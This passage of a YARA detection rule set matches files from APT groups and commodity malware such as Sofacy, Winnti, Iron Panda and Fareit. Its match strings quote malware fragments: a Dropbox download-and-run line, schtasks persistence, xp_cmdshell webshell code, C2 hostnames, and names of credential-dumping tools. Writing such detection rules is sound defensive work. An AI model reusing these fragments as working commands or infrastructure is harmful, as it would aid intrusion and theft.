   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule Sofacy_CollectorStealer_Gen2_RID31F7 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "File collectors / USB stealers - Generic"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/"
      date = "2015-12-04 13:45:01"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "msdetltemp.dll" fullword ascii
      $s2 = "msdeltemp.dll" fullword wide
      $s3 = "Delete Temp Folder Service" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them
} 

rule Sofacy_CollectorStealer_Gen3_RID31F8 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "File collectors / USB stealers - Generic"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/"
      date = "2015-12-04 13:45:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "NvCpld.dll" fullword ascii
      $s4 = "NvStart" fullword ascii
      $s5 = "NvStop" fullword ascii
      $a1 = "%.4d%.2d%.2d%.2d%.2d%.2d%.2d%.4d" fullword wide
      $a2 = "IGFSRVC.dll" fullword wide
      $a3 = "Common User Interface" fullword wide
      $a4 = "igfsrvc Module" fullword wide
      $b1 = " Operating System                        " fullword wide
      $b2 = "Microsoft Corporation                                       " fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( all of ( $s* ) and ( all of ( $a* ) or all of ( $b* ) ) )
} 

rule PHISH_02Dez2015_dropped_p0o6543f_RID312C : DEMO EXE FILE MAL T1136 T1193 T1203 {
   meta:
      description = "Phishing Wave - file p0o6543f.exe"
      author = "Florian Roth"
      reference = "http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/"
      date = "2015-12-02 13:11:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "netsh.exe" fullword wide
      $s2 = "routemon.exe" fullword wide
      $s3 = "script=" fullword wide
      $s4 = "disconnect" fullword wide
      $s5 = "GetClusterResourceTypeKey" fullword ascii
      $s6 = "QueryInformationJobObject" fullword ascii
      $s7 = "interface" fullword wide
      $s8 = "connect" fullword wide
      $s9 = "FreeConsole" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them
} 

rule PHISH_02Dez2015_attach_P_ORD_C_10156_124658_RID3397 : DEMO FILE MAL T1136 T1193 T1203 {
   meta:
      description = "Phishing Wave - file P-ORD-C-10156-124658.xls"
      author = "Florian Roth"
      reference = "http://myonlinesecurity.co.uk/purchase-order-124658-gina-harrowell-clinimed-limited-word-doc-or-excel-xls-spreadsheet-malware/"
      date = "2015-12-02 14:54:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Execute" ascii
      $s2 = "Process WriteParameterFiles" fullword ascii
      $s3 = "WScript.Shell" fullword ascii
      $s4 = "STOCKMASTER" fullword ascii
      $s5 = "InsertEmailFax" ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 200KB and all of them
} 

rule GlassRAT_Generic_RID2D0E : DEMO EXE FILE GEN MAL T1050 T1085 T1136 {
   meta:
      description = "Detects GlassRAT Malware"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/peering-into-glassrat/"
      date = "2015-11-23 10:15:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, GEN, MAL, T1050, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd.exe /c %s" fullword ascii
      $s2 = "update.dll" fullword ascii
      $s3 = "SYSTEM\\CurrentControlSet\\Services\\RasAuto\\Parameters" fullword ascii
      $s4 = "%%temp%%\\%u" fullword ascii
      $s5 = "\\off.dat" fullword ascii
      $s6 = "rundll32 \"%s\",AddNum" fullword ascii
      $s7 = "cmd.exe /c erase /F \"%s\"" fullword ascii
      $s8 = "SYSTEM\\ControlSet00%d\\Services\\RasAuto" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 15MB and 5 of them
} 

rule Fareit_Trojan_Oct15_RID2E24 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Fareit Trojan from Sep/Oct 2015 Wave"
      author = "Florian Roth"
      reference = "http://goo.gl/5VYtlU"
      date = "2015-10-18 11:01:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ebai.exe" fullword wide
      $s2 = "Origina" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and $s1 in ( 0 .. 30000 ) and $s2 in ( 0 .. 30000 )
} 

rule Upatre_Hazgurut_RID2D3B : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Upatre malware dropped by Downloader - file hazgurut.exe"
      author = "Florian Roth"
      reference = "https://weankor.vxstream-sandbox.com/sample/6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3?environmentId=7"
      date = "2015-10-13 10:23:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "barcod" fullword ascii
      $s0 = "msports.dll" fullword ascii
      $s1 = "nddeapi.dll" fullword ascii
      $s2 = "glmf32.dll" fullword ascii
      $s3 = "<requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\">" fullword ascii
      $s4 = "cmutil.dll" fullword ascii
      $s5 = "mprapi.dll" fullword ascii
      $s6 = "glmf32.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1500KB and $a1 in ( 0 .. 4000 ) and all of ( $s* )
} 

rule Winnti_signing_cert_RID2EE5 : CHINA DEMO EXE FILE G0044 MAL T1136 {
   meta:
      description = "Detects a signing certificate used by the Winnti APT group"
      author = "Florian Roth"
      reference = "https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/"
      date = "2015-10-10 11:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, G0044, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Guangzhou YuanLuo Technology Co." ascii
      $s2 = "Guangzhou YuanLuo Technology Co.,Ltd" ascii
      $s3 = "$Asahi Kasei Microdevices Corporation0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them
} 

rule Winnti_malware_Nsiproxy_RID309D : CHINA DEMO EXE FILE G0044 MAL T1014 T1050 T1090 T1136 {
   meta:
      description = "Detects a Winnti rootkit"
      author = "Florian Roth"
      reference = "-"
      date = "2015-10-10 12:47:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, G0044, MAL, T1014, T1050, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Driver\\nsiproxy" fullword wide
      $a1 = "\\Device\\StreamPortal" fullword wide
      $a2 = "\\Device\\PNTFILTER" fullword wide
      $s1 = "Cookie: SN=" fullword ascii
      $s2 = "\\BaseNamedObjects\\_transmition_synchronization_" fullword wide
      $s3 = "Winqual.sys" fullword wide
      $s4 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}" fullword wide
      $s5 = "http://www.wasabii.com.tw 0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and $x1 and 1 of ( $a* ) and 2 of ( $s* )
} 

rule Winnti_malware_UpdateDLL_RID3070 : CHINA DEMO EXE FILE G0044 MAL T1050 T1136 {
   meta:
      description = "Detects a Winnti malware - Update.dll"
      author = "Florian Roth"
      reference = "VTI research"
      date = "2015-10-10 12:39:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, G0044, MAL, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $c1 = "'Wymajtec$Tima Stempijg Sarviges GA -$G2" fullword ascii
      $c2 = "AHDNEAFE1.sys" fullword ascii
      $c3 = "SOTEFEHJ3.sys" fullword ascii
      $c4 = "MainSYS64.sys" fullword ascii
      $s1 = "\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword wide
      $s2 = "Update.dll" fullword ascii
      $s3 = "\\\\.\\pipe\\usbpcex%d" fullword wide
      $s4 = "\\\\.\\pipe\\usbpcg%d" fullword wide
      $s5 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI" fullword wide
      $s6 = "\\??\\pipe\\usbpcg%d" fullword wide
      $s7 = "\\??\\pipe\\usbpcex%d" fullword wide
      $s8 = "HOST: %s" fullword ascii
      $s9 = "$$$--Hello" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( ( 1 of ( $c* ) and 3 of ( $s* ) ) or all of ( $s* ) )
} 

rule Winnti_malware_FWPK_RID2E69 : CHINA DEMO EXE FILE G0044 MAL T1050 T1136 {
   meta:
      description = "Detects a Winnti malware - FWPKCLNT.SYS"
      author = "Florian Roth"
      reference = "VTI research"
      date = "2015-10-10 11:13:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, G0044, MAL, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\Registry\\Machine\\System\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\" fullword wide
      $s1 = "%x:%d->%x:%d, Flag %s%s%s%s%s, seq %u, ackseq %u, datalen %u" fullword ascii
      $s2 = "FWPKCLNT.SYS" fullword ascii
      $s3 = "Port Layer" fullword wide
      $s4 = "%x->%x, icmp type %d, code %d" fullword ascii
      $s5 = "\\BaseNamedObjects\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28E}" fullword wide
      $s6 = "\\Ndi\\Interfaces" fullword wide
      $s7 = "\\Device\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}" fullword wide
      $s8 = "Bad packet" fullword ascii
      $s9 = "\\BaseNamedObjects\\EKV0000000000" fullword wide
      $s10 = "%x->%x" fullword ascii
      $s11 = "IPInjectPkt" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 642KB and all of them
} 

rule Winnti_malware_StreamPortal_Gen_RID3388 : CHINA DEMO EXE FILE G0044 GEN MAL T1136 {
   meta:
      description = "Detects a Winnti malware - Streamportal"
      author = "Florian Roth"
      reference = "VTI research"
      date = "2015-10-10 14:51:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, G0044, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Proxies destination address/port for TCP" fullword wide
      $s3 = "\\Device\\StreamPortal" fullword wide
      $s4 = "Transport-Data Proxy Sub-Layer" fullword wide
      $s5 = "Cookie: SN=" fullword ascii
      $s6 = "\\BaseNamedObjects\\_transmition_synchronization_" fullword wide
      $s17 = "NTOSKRNL.EXE" fullword wide
      $s19 = "FwpsReferenceNetBufferList0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 275KB and all of them
} 

rule Indetectables_RAT_RID2D8E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux"
      author = "Florian Roth"
      reference = "http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/"
      date = "2015-10-01 10:36:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Coded By M3" fullword wide
      $s2 = "Stub Undetector M3" fullword wide
      $s3 = "www.webmenegatti.com.br" wide
      $s4 = "M3n3gatt1" fullword wide
      $s5 = "TheMisterFUD" fullword wide
      $s6 = "KillZoneKillZoneKill" fullword ascii
      $s7 = "[[__M3_F_U_D_M3__]]$" fullword ascii
      $s8 = "M3_F_U_D_M3" ascii
      $s9 = "M3n3gatt1hack3r" fullword wide
      $s10 = "M3n3gatt1hack3r" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 1 of them
} 

rule BergSilva_Malware_RID2DB8 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects a malware from the same author as the Indetectables RAT"
      author = "Florian Roth"
      reference = "-"
      date = "2015-10-01 10:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\Users\\Berg Silva\\Desktop\\" wide
      $x2 = "URLDownloadToFileA 0, \"https://dl.dropbox.com/u/105015858/nome.exe\", \"c:\\nome.exe\", 0, 0" fullword wide
      $s1 = " Process.Start (Path.GetTempPath() & \"name\" & \".exe\") 'start server baixado" fullword wide
      $s2 = "FileDelete(@TempDir & \"\\nome.exe\") ;Deleta o Arquivo para que possa ser executado normalmente" fullword wide
      $s3 = " Lib \"\\WINDOWS\\system32\\UsEr32.dLl\"" fullword wide
      $s4 = "$Directory = @TempDir & \"\\nome.exe\" ;Define a variavel" fullword wide
      $s5 = "https://dl.dropbox.com/u/105015858" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or 2 of ( $s* ) )
} 

rule VSSown_VBS_RID2AAB : DEMO HKTL SCRIPT T1047 T1136 {
   meta:
      description = "Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere"
      author = "Florian Roth"
      reference = "-"
      date = "2015-10-01 07:36:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, SCRIPT, T1047, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Select * from Win32_Service Where Name ='VSS'" ascii
      $s1 = "Select * From Win32_ShadowCopy" ascii
      $s2 = "cmd /C mklink /D " ascii
      $s3 = "ClientAccessible" ascii
      $s4 = "WScript.Shell" ascii
      $s5 = "Win32_Process" ascii
   condition: 
      all of them
} 

rule QuarksPwDump_Gen_RID2D5E : DEMO GEN HKTL T1003 T1136 {
   meta:
      description = "Detects all QuarksPWDump versions"
      author = "Florian Roth"
      reference = "-"
      date = "2015-09-29 10:28:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, HKTL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "OpenProcessToken() error: 0x%08X" fullword ascii
      $s2 = "%d dumped" fullword ascii
      $s3 = "AdjustTokenPrivileges() error: 0x%08X" fullword ascii
      $s4 = "\\SAM-%u.dmp" fullword ascii
   condition: 
      all of them
} 

rule Unit78020_Malware_Gen1_RID2E84 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule"
      author = "Florian Roth"
      reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
      date = "2015-09-24 11:17:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "greensky27.vicp.net" fullword wide
      $x2 = "POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1" fullword ascii
      $x3 = "GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1" fullword ascii
      $x4 = "serch.vicp.net" fullword wide
      $x5 = "greensky27.vicp.net" fullword wide
      $x6 = "greensky27.vicp.net.as" fullword wide
      $x7 = "greensky27.vcip.net" fullword wide
      $x8 = "pnoc-ec.vicp.net" fullword wide
      $x9 = "aseanph.vicp.net" fullword wide
      $x10 = "pnoc.vicp.net" fullword wide
      $a1 = "dMozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide
      $a2 = "User-Agent: Netscape" fullword ascii
      $a3 = "Accept-Language:En-us/r/n" fullword wide
      $a4 = "\\Office Start.lnk" fullword wide
      $a5 = "\\MSN Talk Start.lnk" fullword wide
      $s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide
      $s2 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7" fullword ascii
      $s3 = "%USERPROFILE%\\Application Data\\Mozilla\\Firefox\\Profiles" fullword wide
      $s4 = "Content-Type:application/x-www-form-urlencoded/r/n" fullword wide
      $s5 = "Hello World!" fullword wide
      $s6 = "Accept-Encoding:gzip,deflate/r/n" fullword wide
      $s7 = "/%d%s%d" fullword ascii
      $s8 = "%02d-%02d-%02d %02d:%02d" fullword wide
      $s9 = "WininetMM Version 1.0" fullword wide
      $s10 = "WININETMM" fullword wide
      $s11 = "GET %dHTTP/1.1" fullword ascii
      $s12 = "POST http://%ws:%d/%d%s%dHTTP/1.1" fullword ascii
      $s13 = "PeekNamePipe" fullword ascii
      $s14 = "Normal.dot" fullword ascii
      $s15 = "R_eOR_eOR_eO)CiOS_eO" fullword ascii
      $s16 = "DRIVE_RAMDISK" fullword wide
      $s17 = "%s %s %s %s %d %d %d %d " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 250KB and 1 of ( $x* ) ) or 2 of ( $a* ) or 6 of ( $s* )
} 

rule Unit78020_Malware_1_RID2D6A : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware by Chinese APT PLA Unit 78020 - Specific Rule - msictl.exe"
      author = "Florian Roth"
      reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
      date = "2015-09-24 10:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%ProgramFiles%\\Internet Explorer\\iexplore.exe" fullword ascii
      $s2 = "msictl.exe" fullword ascii
      $s3 = "127.0.0.1:8080" fullword ascii
      $s4 = "mshtml.dat" fullword ascii
      $s5 = "msisvc" fullword ascii
      $s6 = "NOKIAN95/WEB" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 160KB and 4 of them
} 

rule Unit78020_Malware_Gen2_RID2E85 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule"
      author = "Florian Roth"
      reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
      date = "2015-09-24 11:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "-GetModuleFileNameExW" fullword ascii
      $s1 = "\\MSN Talk Start.lnk" fullword wide
      $s2 = ":SeDebugPrivilege" fullword wide
      $s3 = "WinMM Version 1.0" fullword wide
      $s4 = "dwError1 = %d" fullword ascii
      $s5 = "*Can't Get" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule Unit78020_Malware_Gen3_RID2E86 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule - Chong"
      author = "Florian Roth"
      reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
      date = "2015-09-24 11:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "GET http://%ws:%d/%d%s%dHTTP/1.1" fullword ascii
      $x2 = "POST http://%ws:%d/%d%s%dHTTP/1.1" fullword ascii
      $x3 = "J:\\chong\\" ascii
      $s1 = "User-Agent: Netscape" fullword ascii
      $s2 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7" fullword ascii
      $s3 = "Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\User Shell Folders" fullword wide
      $s4 = "J:\\chong\\nod\\Release\\SslMM.exe" fullword ascii
      $s5 = "MM.exe" fullword ascii
      $s6 = "network.proxy.ssl" fullword wide
      $s7 = "PeekNamePipe" fullword ascii
      $s8 = "Host: %ws:%d" fullword ascii
      $s9 = "GET %dHTTP/1.1" fullword ascii
      $s10 = "SCHANNEL.DLL" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) ) or 4 of ( $s* )
} 

rule IronPanda_DNSTunClient_RID2F67 : APT DEMO EXE FILE T1053 T1136 {
   meta:
      description = "Iron Panda malware DnsTunClient - file named.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/E4qia9"
      date = "2015-09-16 11:55:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1053, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "dnstunclient -d or -domain <domain>" fullword ascii
      $s2 = "dnstunclient -ip <server ip address>" fullword ascii
      $s3 = "C:\\Windows\\System32\\cmd.exe /C schtasks /create /tn \"\\Microsoft\\Windows\\PLA\\System\\Microsoft Windows\" /tr " fullword ascii
      $s4 = "C:\\Windows\\System32\\cmd.exe /C schtasks /create /tn \"Microsoft Windows\" /tr " fullword ascii
      $s5 = "taskkill /im conime.exe" fullword ascii
      $s6 = "\\dns control\\t-DNSTunnel\\DnsTunClient\\DnsTunClient.cpp" fullword ascii
      $s7 = "UDP error:can not bing the port(if there is unclosed the bind process?)" fullword ascii
      $s8 = "use error domain,set domain pls use -d or -domain mark(Current: %s,recv %s)" fullword ascii
      $s9 = "error: packet num error.the connection have condurt,pls try later" fullword ascii
      $s10 = "Coversation produce one error:%s,coversation fail" fullword ascii
      $s11 = "try to add many same pipe to select group(or mark is too easy)." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them ) or 5 of them
} 

rule IronPanda_Malware1_RID2DE6 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Iron Panda Malware"
      author = "Florian Roth"
      reference = "https://goo.gl/E4qia9"
      date = "2015-09-16 10:51:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "activedsimp.dll" fullword wide
      $s1 = "get_BadLoginAddress" fullword ascii
      $s2 = "get_LastFailedLogin" fullword ascii
      $s3 = "ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED" fullword ascii
      $s4 = "get_PasswordExpirationDate" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule IronPanda_Webshell_JSP_RID2F6E : APT DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Iron Panda Malware JSP"
      author = "Florian Roth"
      reference = "https://goo.gl/E4qia9"
      date = "2015-09-16 11:56:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
      $s2 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
      $s3 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii
   condition: 
      filesize < 330KB and 1 of them
} 

rule IronPanda_Malware_Htran_RID3011 : APT DEMO EXE FILE MAL T1020 T1090 T1136 {
   meta:
      description = "Iron Panda Malware Htran"
      author = "Florian Roth"
      reference = "https://goo.gl/E4qia9"
      date = "2015-09-16 12:24:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1020, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[-] Gethostbyname(%s) error:%s" fullword ascii
      $s2 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
      $s3 = "-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
      $s4 = "[-] ERROR: Must supply logfile name." fullword ascii
      $s5 = "[SERVER]connection to %s:%d error" fullword ascii
      $s6 = "[+] Make a Connection to %s:%d...." fullword ascii
      $s7 = "[+] Waiting another Client on port:%d...." fullword ascii
      $s8 = "[+] Accept a Client on port %d from %s" fullword ascii
      $s9 = "[+] Make a Connection to %s:%d ......" fullword ascii
      $s10 = "cmshared_get_ptr_from_atom" fullword ascii
      $s11 = "_cmshared_get_ptr_from_atom" fullword ascii
      $s12 = "[+] OK! I Closed The Two Socket." fullword ascii
      $s13 = "[-] TransmitPort invalid." fullword ascii
      $s14 = "[+] Waiting for Client on port:%d ......" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 125KB and 3 of them ) or 5 of them
} 

rule IronPanda_Malware2_RID2DE7 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Iron Panda Malware"
      author = "Florian Roth"
      reference = "https://goo.gl/E4qia9"
      date = "2015-09-16 10:51:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\setup.exe" fullword ascii
      $s1 = "msi.dll.urlUT" fullword ascii
      $s2 = "msi.dllUT" fullword ascii
      $s3 = "setup.exeUT" fullword ascii
      $s4 = "/c del /q %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them
} 

rule IronPanda_Malware3_RID2DE8 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Iron Panda Malware"
      author = "Florian Roth"
      reference = "https://goo.gl/E4qia9"
      date = "2015-09-16 10:51:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "PluginDeflater.exe" fullword wide
      $s1 = ".Deflated" fullword wide
      $s2 = "PluginDeflater" fullword ascii
      $s3 = "DeflateStream" fullword ascii
      $s4 = "CompressionMode" fullword ascii
      $s5 = "System.IO.Compression" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them
} 

rule IronPanda_Malware4_RID2DE9 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Iron Panda Malware"
      author = "Florian Roth"
      reference = "https://goo.gl/E4qia9"
      date = "2015-09-16 10:52:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "TestPlugin.dll" fullword wide
      $s1 = "<a href='http://www.baidu.com'>aasd</a>" fullword wide
      $s2 = "Zcg.Test.AspxSpyPlugins" fullword ascii
      $s6 = "TestPlugin" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them
} 

rule MAL_APT_RocketKitten_Keylogger_RID326D : APT DEMO EXE FILE G0059 MAL T1056 T1136 {
   meta:
      description = "Detects Keylogger used in Rocket Kitten APT"
      author = "Florian Roth"
      reference = "https://goo.gl/SjQhlp"
      date = "2015-09-01 14:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0059, MAL, T1056, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\CWoolger.pdb" ascii
